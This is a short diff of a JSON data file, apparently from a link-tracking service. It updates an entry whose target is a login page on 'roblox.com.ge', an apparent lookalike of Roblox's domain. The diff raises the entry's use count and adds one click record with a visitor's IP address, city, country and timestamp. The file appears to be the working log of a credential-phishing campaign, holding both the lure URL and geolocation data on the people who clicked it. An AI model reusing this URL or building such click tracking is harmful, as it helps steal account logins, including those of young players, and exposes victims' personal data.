@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1333,
+    "useCount": 1334,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10832,6 +10832,14 @@
         "city": "Minneapolis",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777409432973,
+        "ip": "38.250.150.0",
+        "country": "Peru",
+        "city": "Nuevo Chimbote",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
